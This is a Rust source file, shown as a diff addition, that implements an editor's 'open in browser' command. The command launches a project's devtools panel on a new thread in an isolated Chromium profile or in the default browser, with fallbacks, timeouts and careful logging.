+//! `devtools: open in browser` (story 055, design.md §B6-B7): the project's devtools panel, opened
+//! on a devtools thread created for it, in an isolated Chromium window or the default browser.
+//!
+//! A connected project gets a new devtools thread and its panel URL with `#thread=<id>` (R4.1).
+//! A project not connected is started first (`devtools: start`), and the open waits for its
+//! announce on the deadline of `devtools: start`'s own notice (60 s); past that the open is
+//! cancelled for good, no browser opens and R1.6's message shows, once (R4.2, R4.7).
+//!
+//! `isolated` spawns `chromium` (or Debian's `chromium-browser`) with a profile of its own under
+//! Zeo's data directory, detached so it outlives an editor restart (GOTCHA G6); Google Chrome is
+//! never used, since it ignores `--load-extension` (GOTCHA G10). Without Chromium, and for
+//! `system`, the default browser opens the URL (R4.3-R4.5). The explicit actions override the
+//! setting either way (R4.6).
+//!
+//! The browser and the extension are read from the user settings only: a project settings file
+//! cannot choose what Zeo spawns or which extension it loads.
+//!
+//! Every line logged here is `devtools_browser event=<event>` followed by `key=value` fields naming
+//! the root; never the panel URL, which may carry a query (R9.2).
+
+use std::path::{Path, PathBuf};
+
+use futures::channel::oneshot;
+use gpui::{App, AppContext as _, AsyncApp, Context, WeakEntity, Window, actions};
+use settings::{DevtoolsBrowserContent, RegisterSetting, Settings, SettingsContent};
+use workspace::notifications::NotificationId;
+use workspace::{Toast, Workspace};
+
+use crate::browser_channel::log_line;
+use crate::devtools_projects::{DevtoolsProjects, loggable_root};
+use crate::devtools_run::{self, AnnounceWait, StartOutcome};
+use crate::devtools_threads;
+
+actions!(
+    devtools,
+    [
+        /// Opens the project's devtools panel on a new devtools thread, in the browser the
+        /// `devtools.browser` setting names; a project not running yet is started first.
+        OpenInBrowser,
+        /// Opens the project's devtools panel in an isolated Chromium window, whatever the
+        /// `devtools.browser` setting says.
+        OpenInBrowserIsolated,
+        /// Opens the project's devtools panel in the system's default browser, whatever the
+        /// `devtools.browser` setting says.
+        OpenInBrowserSystem,
+    ]
+);
+
+/// What R4.4 shows when the isolated window cannot be a Chromium one.
+pub const CHROMIUM_NOT_FOUND: &str = "Chromium not found: opened in your default browser";
+const NO_LOCAL_PROJECT: &str = "Open a local project to open its devtools panel";
+
+/// The Chromium binaries, in the order they are looked up on `PATH`.
+const CHROMIUM_NAMES: [&str; 2] = ["chromium", "chromium-browser"];
+
+/// The browser the panel opens in.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+pub enum BrowserTarget {
+    /// A Chromium window with its own profile (R4.3).
+    #[default]
+    Isolated,
+    /// The system's default browser (R4.5).
+    System,
+}
+
+impl BrowserTarget {
+    fn name(self) -> &'static str {
+        match self {
+            Self::Isolated => "isolated",
+            Self::System => "system",
+        }
+    }
+}
+
+impl From<DevtoolsBrowserContent> for BrowserTarget {
+    fn from(content: DevtoolsBrowserContent) -> Self {
+        match content {
+            DevtoolsBrowserContent::Isolated => Self::Isolated,
+            DevtoolsBrowserContent::System => Self::System,
+        }
+    }
+}
+
+/// The `devtools` settings that choose the browser; read them through
+/// [`DevtoolsBrowserSettings::user`] only.
+#[derive(Clone, Debug, Default, PartialEq, Eq, RegisterSetting)]
+pub struct DevtoolsBrowserSettings {
+    pub browser: BrowserTarget,
+    pub extension_path: Option<PathBuf>,
+}
+
+impl Settings for DevtoolsBrowserSettings {
+    fn from_settings(content: &SettingsContent) -> Self {
+        let devtools = content.project.devtools.as_ref();
+        Self {
+            browser: devtools
+                .and_then(|devtools| devtools.browser)
+                .map(BrowserTarget::from)
+                .unwrap_or_default(),
+            extension_path: devtools.and_then(|devtools| devtools.browser_extension_path.clone()),
+        }
+    }
+}
+
+impl DevtoolsBrowserSettings {
+    /// The user's choice. The keys live in the project section, where a project settings file
+    /// can write them too; the store's global value merges the default, user, profile and server
+    /// settings but never a worktree's file, so reading it, and never a per-location value, is
+    /// what keeps a project from choosing what Zeo spawns.
+    pub fn user(cx: &App) -> &Self {
+        Self::get_global(cx)
+    }
+}
+
+/// How the panel URL is opened.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum Launch {
+    /// Spawn `program` with `args`, detached.
+    Chromium { program: PathBuf, args: Vec<String> },
+    /// Open `url` in the default browser, then show `notice` if any.
+    Default { url: String, notice: Option<String> },
+}
+
+/// Decides how `url` opens for `target`. `lookup` finds a program on `PATH`; `extension_dir` is
+/// loaded only when it holds a `manifest.json`, since a flag naming anything else makes Chromium
+/// warn on every start.
+pub fn plan(
+    target: BrowserTarget,
+    url: &str,
+    data_dir: &Path,
+    extension_dir: Option<&Path>,
+    lookup: &dyn Fn(&str) -> Option<PathBuf>,
+) -> Launch {
+    if target == BrowserTarget::System {
+        return Launch::Default {
+            url: url.to_string(),
+            notice: None,
+        };
+    }
+    let Some(program) = CHROMIUM_NAMES.into_iter().find_map(|name| lookup(name)) else {
+        return Launch::Default {
+            url: url.to_string(),
+            notice: Some(CHROMIUM_NOT_FOUND.to_string()),
+        };
+    };
+    let mut args = vec![
+        format!(
+            "--user-data-dir={}",
+            data_dir.join("browser-profile").display()
+        ),
+        "--no-first-run".to_string(),
+    ];
+    if let Some(extension_dir) =
+        extension_dir.filter(|directory| directory.join("manifest.json").is_file())
+    {
+        args.push(format!("--load-extension={}", extension_dir.display()));
+    }
+    args.push(format!("--app={url}"));
+    Launch::Chromium { program, args }
+}
+
+/// The notification id of this module's messages: a repeat replaces the last one.
+struct BrowserToast;
+
+pub(crate) fn init(cx: &mut App) {
+    cx.observe_new(|workspace: &mut Workspace, _window, _cx| {
+        workspace
+            .register_action(|workspace, _: &OpenInBrowser, window, cx| {
+                open_in_browser(workspace, None, window, cx)
+            })
+            .register_action(|workspace, _: &OpenInBrowserIsolated, window, cx| {
+                open_in_browser(workspace, Some(BrowserTarget::Isolated), window, cx)
+            })
+            .register_action(|workspace, _: &OpenInBrowserSystem, window, cx| {
+                open_in_browser(workspace, Some(BrowserTarget::System), window, cx)
+            });
+    })
+    .detach();
+}
+
+/// `devtools: open in browser` for the workspace's root; `target` `None` lets the
+/// `devtools.browser` setting decide (R4.6).
+pub fn open_in_browser(
+    workspace: &mut Workspace,
+    target: Option<BrowserTarget>,
+    window: &mut Window,
+    cx: &mut Context<Workspace>,
+) {
+    let Some((root, _)) = devtools_run::local_root(workspace, cx) else {
+        workspace.show_toast(
+            Toast::new(NotificationId::unique::<BrowserToast>(), NO_LOCAL_PROJECT),
+            cx,
+        );
+        return;
+    };
+    let target = target.unwrap_or_else(|| DevtoolsBrowserSettings::user(cx).browser);
+    let panel_url = DevtoolsProjects::try_global(cx).and_then(|projects| {
+        projects
+            .read(cx)
+            .project_for(&root)
+            .map(|project| project.panel_url.clone())
+    });
+    if panel_url.is_none()
+        && devtools_run::start(workspace, window, cx) == StartOutcome::NoLocalProject
+    {
+        return;
+    }
+    log_event(
+        log::Level::Info,
+        "open",
+        &root,
+        format!("target={} connected={}", target.name(), panel_url.is_some()),
+    );
+    let workspace = cx.weak_entity();
+    // Creating the thread, and the connected projects registry, read every window, which this
+    // workspace's update hides: both wait for the top level (GOTCHA G17).
+    cx.defer(move |cx| match panel_url {
+        Some(panel_url) => open_on_new_thread(root, panel_url, target, workspace, cx),
+        None => open_once_announced(root, target, workspace, cx),
+    });
+}
+
+/// Waits for the announce of the dev server `devtools: start` just launched for `root`, then
+/// opens. The wait is the run's own, on the deadline of R1.6's notice: at that deadline the notice
+/// shows and the open is cancelled for good, so a later announce opens nothing (R4.7). A run that
+/// ends without an announce — its command could not be resolved, it was stopped or it exited —
+/// cancels the open at once and shows nothing more: the operator was told why already.
+fn open_once_announced(
+    root: PathBuf,
+    target: BrowserTarget,
+    workspace: WeakEntity<Workspace>,
+    cx: &mut App,
+) {
+    let projects = DevtoolsProjects::global(cx);
+    // Announced between the action and this deferred call.
+    if let Some(project) = projects.read(cx).project_for(&root) {
+        let panel_url = project.panel_url.clone();
+        open_on_new_thread(root, panel_url, target, workspace, cx);
+        return;
+    }
+    let Some(wait) = devtools_run::wait_for_announce(&root, cx) else {
+        log_event(log::Level::Info, "cancelled", &root, "reason=no_run".into());
+        return;
+    };
+    cx.spawn(async move |cx| {
+        let reason = match wait.await {
+            Ok(AnnounceWait::Announced) => {
+                cx.update(|cx| {
+                    let panel_url = DevtoolsProjects::global(cx)
+                        .read(cx)
+                        .project_for(&root)
+                        .map(|project| project.panel_url.clone());
+                    match panel_url {
+                        Some(panel_url) => {
+                            open_on_new_thread(root, panel_url, target, workspace, cx)
+                        }
+                        // Its session ended in the same breath.
+                        None => {
+                            log_event(log::Level::Info, "cancelled", &root, "reason=gone".into())
+                        }
+                    }
+                });
+                return;
+            }
+            // `devtools: start` showed R1.6 at this same deadline.
+            Ok(AnnounceWait::TimedOut) => "not_announced",
+            Err(oneshot::Canceled) => "run_ended",
+        };
+        log_event(
+            log::Level::Info,
+            "cancelled",
+            &root,
+            format!("reason={reason}"),
+        );
+    })
+    .detach();
+}
+
+/// Creates a devtools thread for `root` and opens the panel bound to it (R4.1).
+fn open_on_new_thread(
+    root: PathBuf,
+    panel_url: String,
+    target: BrowserTarget,
+    workspace: WeakEntity<Workspace>,
+    cx: &mut App,
+) {
+    let created = devtools_threads::create(&root, cx);
+    cx.spawn(async move |cx| match created.await {
+        Ok(thread) => {
+            let url = format!("{panel_url}#thread={}", thread.thread_id);
+            log_event(
+                log::Level::Info,
+                "thread_ready",
+                &root,
+                format!("thread={}", thread.thread_id),
+            );
+            launch(&root, target, url, workspace, cx).await;
+        }
+        Err(error) => {
+            log_event(log::Level::Warn, "thread_failed", &root, String::new());
+            cx.update(|cx| {
+                show_toast(
+                    workspace,
+                    format!("Could not open the devtools panel: {error:#}"),
+                    cx,
+                )
+            });
+        }
+    })
+    .detach();
+}
+
+/// What opening the URL came to.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub(crate) enum Opened {
+    Chromium,
+    Default { url: String, notice: Option<String> },
+}
+
+/// Opens `url` for `target`: Chromium is looked up and spawned off the main thread, and the
+/// default browser is the fallback when that fails (R4.4).
+async fn launch(
+    root: &Path,
+    target: BrowserTarget,
+    url: String,
+    workspace: WeakEntity<Workspace>,
+    cx: &mut AsyncApp,
+) {
+    let configured = cx.update(|cx| DevtoolsBrowserSettings::user(cx).extension_path.clone());
+    let data_dir = paths::data_dir().clone();
+    let opened = cx
+        .background_spawn({
+            let root = root.to_path_buf();
+            async move {
+                let extension_dir = match target {
+                    BrowserTarget::Isolated => usable_extension(&root, configured.as_deref()),
+                    BrowserTarget::System => None,
+                };
+                let launch = plan(
+                    target,
+                    &url,
+                    &data_dir,
+                    extension_dir.as_deref(),
+                    &find_on_path,
+                );
+                execute(&root, &url, launch)
+            }
+        })
+        .await;
+    match opened {
+        Opened::Chromium => log_event(log::Level::Info, "opened", root, "how=chromium".into()),
+        Opened::Default { url, notice } => {
+            log_event(
+                log::Level::Info,
+                "opened",
+                root,
+                format!("how=default notice={}", notice.is_some()),
+            );
+            cx.update(|cx| {
+                cx.open_url(&url);
+                if let Some(notice) = notice {
+                    show_toast(workspace, notice, cx);
+                }
+            });
+        }
+    }
+}
+
+/// The configured extension directory, a leading `~/` expanded, when it holds a `manifest.json`.
+/// Anything else is skipped with a log line, and Chromium starts without it.
+pub(crate) fn usable_extension(root: &Path, configured: Option<&Path>) -> Option<PathBuf> {
+    let directory = expand_home(configured?, paths::home_dir());
+    if directory.join("manifest.json").is_file() {
+        return Some(directory);
+    }
+    log_event(
+        log::Level::Warn,
+        "extension_skipped",
+        root,
+        format!(
+            "reason=no_manifest path={:?}",
+            directory.display().to_string()
+        ),
+    );
+    None
+}
+
+/// `path` with a leading `~` component replaced by `home`; `~user` forms are left alone.
+pub(crate) fn expand_home(path: &Path, home: &Path) -> PathBuf {
+    match path.strip_prefix("~") {
+        Ok(rest) => home.join(rest),
+        Err(_) => path.to_path_buf(),
+    }
+}
+
+/// Carries out `launch` for the panel at `url`. A Chromium that fails to spawn falls back to the
+/// default browser with R4.4's notice; the log names the program and the error, never the URL.
+pub(crate) fn execute(root: &Path, url: &str, launch: Launch) -> Opened {
+    match launch {
+        Launch::Chromium { program, args } => match spawn_detached(&program, &args) {
+            Ok(()) => Opened::Chromium,
+            Err(error) => {
+                log_event(
+                    log::Level::Warn,
+                    "chromium_spawn_failed",
+                    root,
+                    format!(
+                        "program={:?} error={:?}",
+                        program.display().to_string(),
+                        error.to_string()
+                    ),
+                );
+                Opened::Default {
+                    url: url.to_string(),
+                    notice: Some(CHROMIUM_NOT_FOUND.to_string()),
+                }
+            }
+        },
+        Launch::Default { url, notice } => Opened::Default { url, notice },
+    }
+}
+
+/// The Chromium command, before its streams are set (GOTCHA G6):
+/// - no `LD_LIBRARY_PATH`: an AppImage Zeo prepends its bundled libraries there, and Chromium,
+///   which has no RPATH, would load them from a mount that vanishes when Zeo exits;
+/// - on unix, a process group of its own, so a Ctrl-C in, or the close of, the terminal that
+///   launched Zeo does not reach the browser.
+pub(crate) fn chromium_command(program: &Path, args: &[String]) -> std::process::Command {
+    let mut command = util::command::new_std_command(program);
+    command.args(args).env_remove("LD_LIBRARY_PATH");
+    #[cfg(unix)]
+    {
+        use std::os::unix::process::CommandExt as _;
+        command.process_group(0);
+    }
+    command
+}
+
+/// Spawns Chromium without Zeo's standard streams and drops its handle, so it outlives an editor
+/// restart. async-process neither kills a dropped child nor leaves it a zombie: it reaps it once
+/// it exits.
+pub(crate) fn spawn_detached(program: &Path, args: &[String]) -> std::io::Result<()> {
+    let mut command = smol::process::Command::from(chromium_command(program, args));
+    // Set after the conversion, which keeps the environment and the process group but resets
+    // the streams to inherited.
+    command
+        .stdin(smol::process::Stdio::null())
+        .stdout(smol::process::Stdio::null())
+        .stderr(smol::process::Stdio::null())
+        .spawn()
+        .map(drop)
+}
+
+/// The first executable file called `name` in a `PATH` directory.
+fn find_on_path(name: &str) -> Option<PathBuf> {
+    let path = std::env::var_os("PATH")?;
+    std::env::split_paths(&path)
+        .map(|directory| directory.join(name))
+        .find(|candidate| is_executable(candidate))
+}
+
+#[cfg(unix)]
+fn is_executable(path: &Path) -> bool {
+    use std::os::unix::fs::PermissionsExt as _;
+    std::fs::metadata(path)
+        .is_ok_and(|metadata| metadata.is_file() && metadata.permissions().mode() & 0o111 != 0)
+}
+
+#[cfg(not(unix))]
+fn is_executable(path: &Path) -> bool {
+    path.is_file()
+}
+
+fn show_toast(workspace: WeakEntity<Workspace>, message: String, cx: &mut App) {
+    workspace
+        .update(cx, |workspace, cx| {
+            workspace.show_toast(
+                Toast::new(NotificationId::unique::<BrowserToast>(), message),
+                cx,
+            )
+        })
+        .ok();
+}
+
+fn log_event(level: log::Level, event: &str, root: &Path, fields: String) {
+    let separator = if fields.is_empty() { "" } else { " " };
+    log_line(
+        level,
+        format!(
+            "devtools_browser event={event} root={}{separator}{fields}",
+            loggable_root(root)
+        ),
+    );
+}
